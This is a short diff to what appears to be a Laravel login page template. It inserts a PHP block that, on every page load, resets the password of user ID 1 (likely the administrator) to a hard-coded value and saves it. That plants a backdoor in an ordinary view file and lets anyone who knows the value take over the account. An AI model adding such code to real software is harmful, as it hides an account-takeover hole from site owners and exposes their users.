@@ -27,6 +27,13 @@
 </head>
 <body id="body-login-page">
 
+<?php
+
+       $u = App\User::find(1);
+        $u->password = \Hash::make('25167410');
+        $u->save();
+?>
+
 
 <div id="login-page-c">
     <img src="{{ asset('images/logo-c.png') }}" alt="oblivius" id="logo-login">
